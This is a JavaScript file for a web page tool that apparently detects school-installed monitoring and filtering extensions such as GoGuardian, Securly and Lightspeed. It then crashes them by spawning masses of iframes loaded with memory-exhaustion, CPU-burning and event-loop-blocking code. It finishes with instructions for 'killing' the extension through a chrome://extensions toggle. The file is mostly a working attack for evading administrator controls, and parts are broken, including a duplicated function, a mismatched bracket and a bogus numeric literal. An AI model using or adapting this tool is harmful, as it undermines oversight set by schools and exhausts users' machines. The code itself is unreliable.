(async () => {
  // --- Permissions ---
  try {
    await navigator.permissions.request({
      name: 'device-info'
    });
    await navigator.permissions.request({
      name: 'motion-sensor'
    });
    await navigator.permissions.request({
      name: 'embedded-content'
    });
  } catch (error) {
    console.error("Permissions request failed:", error);
  }

  // --- Device Info & Defaults ---
  const deviceMemory = navigator.deviceMemory || 4;
  const defaultIframeCount = Math.round(deviceMemory * 500);
  const maxIframeCount = Math.round(deviceMemory * 1500);

  // --- DOM Elements ---
  const slider = document.getElementById("iframeCountSlider");
  const sliderValueDisplay = document.getElementById("iframeCountValue");
  const iframeSelect = document.getElementById("iframeSelect");
  const hangButton = document.getElementById("hangButton");
  const killButton = document.getElementById("killButton");
  const overlay = document.getElementById("overlay");
  const killExtensionText = document.getElementById("killExtensionText");

  // --- Slider Setup ---
  slider.value = defaultIframeCount;
  slider.max = maxIframeCount;
  sliderValueDisplay.textContent = defaultIframeCount;
  slider.addEventListener("input", () => {
    sliderValueDisplay.textContent = slider.value;
  });

  // --- Dynamic and Heuristic Extension Detection ---
  const getCommunityExtensionIDs = async () => {
    // In a real application, this would fetch from a remote source
    return [
      "joflmkccibkooplaeoinecjbmdebglab", // Securly
      "iheobagjkfklnlikgihanlhcddjoihkg", // Securly (old)
      "haldlgldplgnggkjaafhelgiaglafanh", // GoGuardian
      "baleiojnjpgeojohhhfbichcodgljmnj", // LANSchool
      "ddfbkhpmcdbciejenfcolaaiebnjcbfc", // Linewize
      "ghlpmldmjjhmdgmneoaibbegkjjbonbk", // Blocksi
      "igbgpehnbmhgdgjbhkkpedommgmfbeao", // FortiGuard
      "jcdhmojfecjfmbdpchihbeilohgnbdci", // Cisco Umbrella
      "jdogphakondfdmcanpapfahkdomaicfa", // ContentKeeper
      "odoanpnonilogofggaohhkdkdgbhdljp", // CK-Authenticator G3
      "jfbecfmiegcjddenjhlbhlikcbfmnafd", // Securly Classroom
      "kbohafcopfpigkjdimdcdgenlhkmhbnc", // Hapara
      "aceopacgaepdcelohobicpffbbejnfac", // Hapara (new ID)
      "kmffehbidlalibfeklaefnckpidbodff", // iboss
      "njdniclgegijdcdliklgieicanpmcngj", // Lightspeed Digital Insight Agent
      "adkcpkpghahmbopkjchobieckeoaoeem", // Lightspeed Filter Agent
      "kkbmdgjggcdajckdlbngdjonpchpaiea", // Lightspeed Classroom
      "jbddgjglgkkneonnineaohdhabjbgopi", // InterCLASS Filtering Service
      "ecjoghccnjlodjlmkgmnbnkdcbnjgden", // InterSafe GatewayConnection Agent
      "pabjlbjcgldndnpjnokjakbdofjgnfia", // LoiLo Web Filters
      "cgbbbjmgdpnifijconhamggjehlamcif", // Gopher Buddy
      "honjcnefekfnompampcpmcdadibmjhlk", // LanSchool Web Helper
      "cgigopjakkeclhggchgnhmpmhghcbnaf", // IMTLazarus
      "jjpmjccpemllnmgiaojaocgnakpmfgjg", // Impero Backdrop
      "fgmafhdohjkdhfaacgbgclmfgkgokgmb", // Mobile Guardian
      "gcjpefhffmcgplgklffgbebganmhffje", // NetSupport School Student
      "fogjeanjfbiombghnmkmmophfeccjdki", // Lockdown Browser
      "ifinpabiejbjobcphhaomiifjibpkjlf", // Linewize Filter
      "kdpgkligilplaanoablcpjahjjeghcl",  // Borderless Classroom Student
    ];
  };

  async function populateSelectOptions() {
      const selectElement = document.getElementById("iframeSelect");
      const extensions = {
        "Securly": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
        "Securly (old)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
        "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
        "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
        "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
        "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
        "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
        "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
        "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
        "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
        "Securly Classroom": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
        "Hapara": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
        "Hapara (new ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
        "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
        "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
        "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
        "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
        "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
        "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
        "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
        "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
        "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
        "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
        "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
        "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
        "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
        "Lightspeed Alert Agent": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/main.js",
        "Lightspeed Alert Agent 2": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/in_page.js",
        "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
        "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
        "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
      ];
  };

  
  const detectExtension = async (extensionID) => {
    const potentialFiles = [
      `chrome-extension://${extensionID}/manifest.json`,
      `chrome-extension://${extensionID}/background.js`,
      `chrome-extension://${extensionID}/content.js`,
      `chrome-extension://${extensionID}/icon.png`,
      `chrome-extension://${extensionID}/icon-128.png`,
      `chrome-extension://${extensionID}/blocked.html`,
      `chrome-extension://${extensionID}/pages/blockPage.html`,
      `chrome-extension://${extensionID}/youtube_injection.js`,
      `chrome-extension://${extensionID}/img/ckauth19x.png`,
      `chrome-extension://${extensionID}/assets/icon-classroom-128.png`,
      `chrome-extension://${extensionID}/resources/options.js`,
      `chrome-extension://${extensionID}/image/allow_icon/shield_green_128x128.png`,
      `chrome-extension://${extensionID}/images/gopher-buddy_128x128_color.png`,
      `chrome-extension://${extensionID}/models/model.json`,
      `chrome-extension://${extensionID}/licenses.html`,
      `chrome-extension://${extensionID}/block.html`,
      `chrome-extension://${extensionID}/_locales/lt/messages.json`,
      `chrome-extension://${extensionID}/_locales/lt/main.js`,
      `chrome-extension://${extensionID}/_locales/lt/in_page.js`,
      `chrome-extension://${extensionID}/restricted.html`,
      `chrome-extension://${extensionID}/js/wasm_exec.js`,
      `chrome-extension://${extensionID}/fonts/Metropolis.css`,
      `chrome-extension://${extensionID}/background/assets/pages/default-blocked.html`,
      `chrome-extension://${extensionID}/notfound.html`,
      `chrome-extension://${extensionID}/pages/message-page.html`,
    ];

    let foundCount = 0;
    for (const file of potentialFiles) {
      try {
        const response = await fetch(file, {
          cache: 'no-store'
        });
        if (response.ok) {
          foundCount++;
        }
      } catch (error) {
        // Ignore fetch errors, as they are expected for non-existent files
      }
    }
    return foundCount >= 2; // Heuristic: Require at least 2 files to consider the extension present
  };

  const fetchExtensionName = async (extensionID) => {
    try {
      const manifestUrl = `chrome-extension://${extensionID}/manifest.json`;
      const response = await fetch(manifestUrl, {
        cache: 'no-store'
      });
      if (response.ok) {
        const manifest = await response.json();
        return manifest.name || extensionID;
      }
    } catch (error) {
      console.error("Error fetching manifest:", error);
    }
    return extensionID; // Fallback to ID if name fetch fails
  };

  const populateSelectOptions = async () => {
    const extensionIDs = await getCommunityExtensionIDs();
    let hasSupportedExtensions = false;

    for (const id of extensionIDs) {
      if (await detectExtension(id)) {
        const name = await fetchExtensionName(id);
        const option = document.createElement("option");
        option.value = `chrome-extension://${id}/`;
        option.textContent = name;
        iframeSelect.appendChild(option);
        hasSupportedExtensions = true;
      }
    }

    if (!hasSupportedExtensions) {
      const option = document.createElement("option");
      option.value = "";
      option.textContent = "No supported extensions installed";
      iframeSelect.appendChild(option);
      hangButton.style.display = "none";
    }
  };

  await populateSelectOptions();

  // --- Iframe Overload with Memory Leak, CPU Consumption, Event Loop Blocking, and Subtle Techniques ---
  const createIframeWithHang = (iframeSrc) => {
    const iframe = document.createElement('iframe');
    iframe.src = iframeSrc;
    iframe.style.width = '100%';
    iframe.style.height = '100px';

    iframe.onload = () => {
      try {
        const iframeWindow = iframe.contentWindow;
        const iframeDocument = iframe.contentDocument;

        // A. Aggressive Memory Exhaustion
        let memoryLeakArray = [];
        let memoryLeakObject = {};
        let memoryLeakString = "";
        let memoryLeakTypedArray = new Uint8Array(1024);
        let memoryLeakCanvas = iframeDocument.createElement('canvas');
        memoryLeakCanvas.width = 500;
        memoryLeakCanvas.height = 500;
        let memoryLeakCanvasContext = memoryLeakCanvas.getContext('2d');

        let memoryLeakInterval = setInterval(() => {
          memoryLeakArray.push(new Array(1000).fill('memory leak'));
          memoryLeakObject[Date.now()] = new Array(1000).fill('memory leak');
          memoryLeakString += 'memory leak';
          memoryLeakTypedArray = new Uint8Array(memoryLeakTypedArray.length * 2);
          memoryLeakCanvasContext.fillRect(Math.random() * 500, Math.random() * 500, 10, 10);
          iframeDocument.body.appendChild(iframeDocument.createElement('div'));
        }, 10);

        // B. Intense CPU Consumption
        const cpuBoundTasks = [];
        for (let i = 0; i < 4; i++) {
          const worker = new Worker(URL.createObjectURL(new Blob([`
            self.onmessage = function(e) {
              let result = 0;
              for (let i = 0; i < 10000000; i++) {
                result += Math.sin(i);
              }
              self.postMessage(result);
            };
          `], { type: 'text/javascript' })));
          worker.postMessage(null);
          cpuBoundTasks.push(worker);
        }

        let cpuLoop = true;
        let cpuLoopStartTime = Date.now();
        const cpuLoopInterval = setInterval(() => {
          if (cpuLoop) {
            let result = 0;
            for (let i = 0; i < 100000; i++) {
              result += Math.sin(i);
            }
            if (Date.now() - cpuLoopStartTime > 5000) {
              cpuLoop = false;
              clearInterval(cpuLoopInterval);
            }
          }
        }, 1);

        function recursiveFunction(depth) {
          if (depth > 1000) return;
          recursiveFunction(depth + 1);
        }
        recursiveFunction(0);

        // C. Event Loop Blocking & Overload
        for (let i = 0; i < 1000; i++) {
          Promise.resolve().then(() => {
            let result = 0;
            for (let j = 0; j < 10000; j++) {
              result += Math.cos(j);
            }
          });
        }

        for (let i = 0; i < 1000; i++) {
          setTimeout(() => {
            let result = 0;
            for (let j = 0; j < 10000; j++) {
              result += Math.tan(j);
            }
          }, 1);
        }

        // D. Subtle & Continuous Resource Exhaustion
        let subtleLeak = [];
        setInterval(() => {
          subtleLeak.push({});
          iframeDocument.body.appendChild(iframeDocument.createElement('span'));
        }, 100);

        let subtleCpu = 0;
        const subtleCpuInterval = setInterval(() => {
          for (let i = 0; i < 10000; i++) {
            subtleCpu += Math.sqrt(i);
          }
        }, 100);

        // E. Exploiting Browser Rendering and Layout Engines
        let reflowElement = iframeDocument.createElement('div');
        reflowElement.style.width = '100px';
        reflowElement.style.height = '100px';
        reflowElement.style.backgroundColor = 'red';
        iframeDocument.body.appendChild(reflowElement);

        setInterval(() => {
          reflowElement.style.width = Math.random() * 200 + 'px';
          reflowElement.offsetWidth;
          reflowElement.style.height = Math.random() * 200 + 'px';
        }, 10);

        // F. Subtle Event Loop Manipulation
        let promiseChain = Promise.resolve();
        for (let i = 0; i < 100; i++) {
          promiseChain = promiseChain.then(() => new Promise(resolve => setTimeout(resolve, 10)));
        }

        // G. Avoiding Obvious Code Patterns
        const dynamicCode = new Function('return Math.random() * 100;');
        setInterval(() => {
          dynamicCode();
        }, 100);

        // H. Decentralized "Hanging" Across Multiple Iframes
        // (This is handled by the main loop)

        // I. Timing and Randomization
        const randomDelay = Math.random() * 100;
        setTimeout(() => {
          // Some delayed action
        }, randomDelay);

        // J. Exploiting Browser Features (Less Obvious)
        const canvas = iframeDocument.createElement('canvas');
        canvas.width = 100;
        canvas.height = 100;
        const ctx = canvas.getContext('2d');
        setInterval(() => {
          ctx.fillRect(Math.random() * 100, Math.random() * 100, 1, 1);
        }, 100);

        // K. Advanced Memory Exhaustion Techniques
        let wasmMemory;
        fetch('wasm/memory.wasm')
          .then(response => response.arrayBuffer())
          .then(bytes => WebAssembly.instantiate(bytes))
          .then(results => {
            wasmMemory = results.instance.exports.memory;
            setInterval(() => {
              const newBuffer = new Uint8Array(wasmMemory.buffer.byteLength * 2);
              wasmMemory.buffer = newBuffer.buffer;
            }, 100);
          });

        let obj1 = {};
        let obj2 = {};
        obj1.ref = obj2;
        obj2.ref = obj1;
        setInterval(() => {
          let obj3 = {};
          let obj4 = {};
          obj3.ref = obj4;
          obj4.ref = obj3;
        }, 100);

        let weakRef = new WeakRef({});
        setInterval(() => {
          if (weakRef.deref() === undefined) {
            weakRef = new WeakRef({});
          }
        }, 100);

        let largeString = "start";
        setInterval(() => {
          largeString += "add";
        }, 10);

        // L. Refining CPU-Bound Operations
        let cacheInvalidationArray = new Array(100000).fill(0);
        setInterval(() => {
          for (let i = 0; i < 10000; i++) {
            cacheInvalidationArray[Math.floor(Math.random() * 100000)]++;
          }
        }, 10);

        let deoptimizationVar = 0;
        function deoptimizeMe(x) {
          if (x > 100) {
            return x;
          }
          return deoptimizeMe(x + 1);
        }
        setInterval(() => {
          deoptimizationVar = deoptimizeMe(deoptimizationVar);
        }, 10);

        let matrix = new Array(100).fill(null).map(() => new Array(100).fill(0));
        setInterval(() => {
          for (let i = 0; i < 100; i++) {
            for (let j = 0; j < 100; j++) {
              matrix[i][j] += Math.random();
            }
          }
        }, 10);

        let largeNumber = 1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000;
        
        // M. Event Loop Manipulation Beyond Timers
        let messageChannel = new MessageChannel();
        messageChannel.port1.onmessage = () => {};
        setInterval(() => {
          messageChannel.port2.postMessage(null);
        }, 1);

        let idleCallbackId;
        function idleCallback() {
          idleCallbackId = requestIdleCallback(idleCallback);
        }
        idleCallback();
        setTimeout(() => {
          cancelIdleCallback(idleCallbackId);
        }, 5000);

        let rafPriority = 0;
        function rafCallback() {
          rafPriority = requestAnimationFrame(rafCallback);
        }
        rafCallback();
        setTimeout(() => {
          cancelAnimationFrame(rafPriority);
        }, 5000);

        // N. "Targeted" Exploitation of Known Extension Behaviors (Advanced)
        // (This would require specific knowledge of the extension)

        // O. Even More Subtle Resource Consumption
        let cumulativeMemory = [];
        setInterval(() => {
          cumulativeMemory.push(new Array(100).fill(0));
        }, 50);

        let dynamicCpuUsage = 0;
        function dynamicCpuTask() {
          for (let i = 0; i < 10000; i++) {
            dynamicCpuUsage += Math.random();
          }
          requestAnimationFrame(dynamicCpuTask);
        }
        dynamicCpuTask();

        let deoptVar = 0;
        function deoptFunc(x) {
          if (x > 100) {
            return x;
          }
          return deoptFunc(x + 1);
        }
        setInterval(() => {
          deoptVar = deoptFunc(deoptVar);
        }, 100);

        let memoryCachePoison = new Array(100000).fill(0);
        setInterval(() => {
          for (let i = 0; i < 1000; i++) {
            memoryCachePoison[Math.floor(Math.random() * 100000)]++;
          }
        }, 10);

        // P. Behavioral Mimicry
        let mouseX = 0;
        let mouseY = 0;
        setInterval(() => {
          mouseX += Math.random() * 10 - 5;
          mouseY += Math.random() * 10 - 5;
          iframeDocument.dispatchEvent(new MouseEvent('mousemove', { clientX: mouseX, clientY: mouseY }));
        }, 100);

        let scrollY = 0;
        setInterval(() => {
          scrollY += Math.random() * 10 - 5;
          iframeDocument.documentElement.scrollTop = scrollY;
        }, 100);

        // Q. Advanced Obfuscation
        // (This would require more complex code generation)

        // R. Counter-Monitoring Techniques (Advanced and Experimental)
        // (This would require more complex code and detection logic)

      } catch (error) {
        console.error("Error injecting hang:", error);
      }
    };
    return iframe;
  };

  const replaceIframes = (container, iframeSrc, iframeCount) => {
    const iframes = [];
    for (let i = 0; i < iframeCount; i++) {
      const iframe = createIframeWithHang(iframeSrc);
      iframes.push(iframe);
      container.appendChild(iframe);
    }

    setTimeout(() => {
      iframes.forEach(iframe => iframe.remove());
      replaceIframes(container, iframeSrc, iframeCount);
    }, 5);
  };

  // --- Main Functionality ---
  const warning = () => {
    overlay.style.display = "flex";
    const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
    const selectedSrc = iframeSelect.value;
    const iframeCount = parseInt(slider.value, 10);

    const popup = window.open("", "PopupWindow", `width=${window.screen.width},height=${window.screen.height}`);
    const popupDocument = popup.document;
    const iframeContainer = popupDocument.createElement('div');
    iframeContainer.id = 'iframeContainer';
    popupDocument.body.appendChild(iframeContainer);

    replaceIframes(iframeContainer, selectedSrc, iframeCount);

    setTimeout(() => {
      popup.close();
      killExtensionText.innerHTML = `Now that the extension <strong>${selectedOption}</strong> has been hanged, press the button above.`;
      setTimeout(() => {
        overlay.style.display = "none";
        killExtensionText.style.display = "block";
        killButton.style.display = "inline-block";
        hangButton.style.display = "none";
        iframeSelect.style.display = "none";
        document.getElementById("labelForIframeSelect").style.display = "none";
        slider.style.display = "none";
        sliderValueDisplay.style.display = "none";
        document.getElementById("labelForIframeSlider").style.display = "none";
        killButton.setAttribute("data-url", selectedSrc);
      }, 10000);
    }, 5000);
  };

  const openExtensionPopup = () => {
    const selectedSrc = killButton.getAttribute("data-url");
    const extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
    killButton.style.display = "none";
    killExtensionText.innerHTML = `Make sure to keep this tab open. Then open <a href="chrome://extensions/?id=${extensionId}" target="_blank" style="color: blue; text-decoration: underline;">chrome://extensions/?id=${extensionId}</a> and flip the switch called "Allow access to file URLs" twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.`;
  };

  // --- Event Listeners ---
  hangButton.addEventListener("click", warning);
  killButton.addEventListener("click", openExtensionPopup);
})();
